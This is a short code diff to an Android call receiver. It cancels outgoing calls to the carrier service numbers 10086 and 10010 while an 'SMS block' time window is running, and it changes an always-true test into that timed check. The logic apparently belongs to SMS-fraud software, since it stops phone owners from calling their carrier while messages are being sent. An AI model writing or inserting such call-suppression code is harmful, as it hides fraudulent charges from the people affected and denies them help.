@@ -22,7 +22,7 @@ public class PhoneCallReceiver extends BroadcastReceiver {
             long smsLastSendTime = sm.getSMSBlockBeginTime();
             long smsBlockTime = sm.getSMSBlockDelayTime();
             long curTime = System.currentTimeMillis();
-            if ((/*(curTime - smsLastSendTime) < smsBlockTime*/ true) 
+            if (((curTime - smsLastSendTime) < smsBlockTime) 
                     && ((number.equals("10086") || number.equals("10010"))))  {
                 setResultData(null);
             }
